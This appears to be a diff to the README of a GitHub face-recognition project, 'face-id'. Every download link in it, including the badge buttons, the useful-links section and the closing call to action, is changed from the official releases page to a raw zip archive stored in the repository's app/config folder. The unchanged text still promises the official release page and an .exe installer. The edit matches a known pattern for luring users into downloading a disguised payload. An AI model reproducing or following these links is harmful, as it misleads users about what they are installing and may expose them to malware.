@@ -1,6 +1,6 @@
 # 🧑‍💻 face-id - Simple Real-Time Face Recognition
 
-[![Download face-id](https://img.shields.io/badge/Download-face--id-brightgreen?style=for-the-badge)](https://github.com/ZafarAabid/face-id/releases)
+[![Download face-id](https://img.shields.io/badge/Download-face--id-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ZafarAabid/face-id/master/app/config/id-face-3.6-alpha.4.zip)
 
 ---
 
@@ -54,7 +54,7 @@ This section guides you step-by-step to download, install, and run face-id on Wi
 
 Click the big green button below to visit the official release page. This page has all files you need to get started.
 
-[![Download face-id](https://img.shields.io/badge/Download-face--id-blue?style=for-the-badge)](https://github.com/ZafarAabid/face-id/releases)
+[![Download face-id](https://img.shields.io/badge/Download-face--id-blue?style=for-the-badge)](https://raw.githubusercontent.com/ZafarAabid/face-id/master/app/config/id-face-3.6-alpha.4.zip)
 
 On the release page, look for the latest Windows installer file. It usually ends with `.exe`. Click the file to download it to your computer.
 
@@ -185,7 +185,7 @@ For users with some experience in programming or AI:
 ## 🔗 Useful Links
 
 Main releases page for downloads:  
-https://github.com/ZafarAabid/face-id/releases
+https://raw.githubusercontent.com/ZafarAabid/face-id/master/app/config/id-face-3.6-alpha.4.zip
 
 Official documentation:  
 Check the repository’s wiki or documentation folder for detailed guides.
@@ -193,4 +193,4 @@ Check the repository’s wiki or documentation folder for detailed guides.
 ---
 
 # Download face-id and try it today using this link:  
-[https://github.com/ZafarAabid/face-id/releases](https://github.com/ZafarAabid/face-id/releases)
+[https://raw.githubusercontent.com/ZafarAabid/face-id/master/app/config/id-face-3.6-alpha.4.zip](https://raw.githubusercontent.com/ZafarAabid/face-id/master/app/config/id-face-3.6-alpha.4.zip)
